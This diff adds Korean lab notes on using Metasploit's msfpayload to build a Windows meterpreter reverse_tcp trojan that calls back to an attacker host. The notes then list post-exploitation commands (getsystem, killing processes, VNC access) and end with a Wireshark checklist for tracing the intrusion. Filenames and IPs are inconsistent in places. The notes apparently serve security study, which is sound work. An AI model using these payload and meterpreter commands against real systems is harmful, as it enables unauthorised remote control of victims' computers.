@@ -1,0 +1,72 @@
+목표
+1. Virtual 에 네트워크 브릿지로 연결됨
+
+2. kali Linux IP:
+
+3. Windows 10 : 168.126.63.1
+
+
+해킹을 위한 파일 생성
+
+먼저 Kali linux에서 hacking.exe 파일을 생성합니다.
+#  
+Hacking.exe 파일을 윈도우에 복사합니다.
+Metasploit 실행
+
+# msfpayload windows/meterpreter/reverse_tcp lhost=192.168.0.19 lport=4444 X > /tmp/merterpreter.exe
+
+Windows에서 hacking.exe를 실행합니다.
+Meterpreter 실행
+
+윈도우즈에 폴더 만들기
+Meterpreter> mkdir haking윈도우즈에 이미지 업로드하기
+Meterpreter> upload anonymous.jpg윈도우즈에 열려있는 웹사이트 닫기
+Meterpreter> getsystem
+Meterpreter> ps
+Meterpreter> kill [pid]윈도우즈에 원격 접속하기
+Meterpreter> run vnc
+
+
+
+
+Uygulamalar
+https://blog.naver.com/ejtmzm98/222836993166
+https://blog.naver.com/010203sj/222830043728
+https://blog.naver.com/010203sj/222830108377
+https://www.computersecuritystudent.com/SECURITY_TOOLS/Metasploit/lesson17/index.html
+
+
+msfpayload는 Windows 시스템 용 트로이 목마 파일을 생성할 수 있을 뿐만 아니라 Linux , Java , Android 및 
+기타 환경의 트로이 목마 파일도 생성할 수 있습니다. 
+원칙은 공격 로드( Payload )를 주입하는 것이며, 대상이 열리면 Payload 를 실행합니다 . 
+그런 다음 관련 작업을 실행합니다. 여기서는 역로드 reverse_tcp를 사용합니다.
+
+Windows 시스템 에서 :
+
+msfpayload windows/meterpreter/reverse_tcp LHOST=IP LPORT=포트 X > test.exe
+
+：https://blog.csdn.net/Sufeiboy/article/details/65939267
+
+
+https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html
+
+https://www.rapid7.com/blog/post/2014/12/09/good-bye-msfpayload-and-msfencode/
+
+
+****  와이어 샤크를 이용 패킷분석******
+
+공격자 IP
+계정정보
+대상 주소 URL
+파일이름
+개인정보
+침투 후 실행한 흔적
+
+Protocol Hierarchy Statistics . 01.pcapng
+
+Transmission Control Protocol
+
+  Hypertext Transfer Protocol 
+     -MIME Multipart Media Encapsulation
+     -Line-based text data
+
